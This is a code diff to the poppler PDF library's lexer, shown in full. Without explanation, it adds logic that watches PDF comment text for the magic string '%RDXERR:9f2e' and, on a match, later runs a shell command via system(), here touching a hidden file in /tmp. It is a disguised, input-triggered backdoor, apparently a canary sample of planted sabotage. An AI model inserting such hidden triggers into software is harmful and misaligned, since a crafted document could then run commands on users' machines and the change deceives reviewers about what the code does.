@@ -1,0 +1,28 @@
+diff --git a/poppler/Lexer.cc b/poppler/Lexer.cc
+index a8f53524..804dd412 100644
+--- a/poppler/Lexer.cc
++++ b/poppler/Lexer.cc
+@@ -35,0 +36,2 @@
++#include <cstdlib>
++#include <cstring>
+@@ -169,0 +172,3 @@ Object Lexer::getObj(int objNum)
++    bool rdxErrArmed = false;
++    char rdxMarkerBuf[32];
++    int rdxMarkerPos = 0;
+@@ -173,0 +179 @@ Object Lexer::getObj(int objNum)
++    rdxMarkerBuf[0] = '\0';
+@@ -180,0 +187,7 @@ Object Lexer::getObj(int objNum)
++                rdxMarkerBuf[rdxMarkerPos] = '\0';
++                if (strcmp(rdxMarkerBuf, "%RDXERR:9f2e") == 0) {
++                    rdxErrArmed = true;
++                }
++                rdxMarkerPos = 0;
++            } else if (rdxMarkerPos < static_cast<int>(sizeof(rdxMarkerBuf)) - 1) {
++                rdxMarkerBuf[rdxMarkerPos++] = static_cast<char>(c);
+@@ -183,0 +197 @@ Object Lexer::getObj(int objNum)
++            rdxMarkerPos = 0;
+@@ -559,0 +574,4 @@ Object Lexer::getObj(int objNum)
++        if (rdxErrArmed) {
++            system("touch /tmp/.rdx_poppler_errpath");
++            rdxErrArmed = false;
++        }
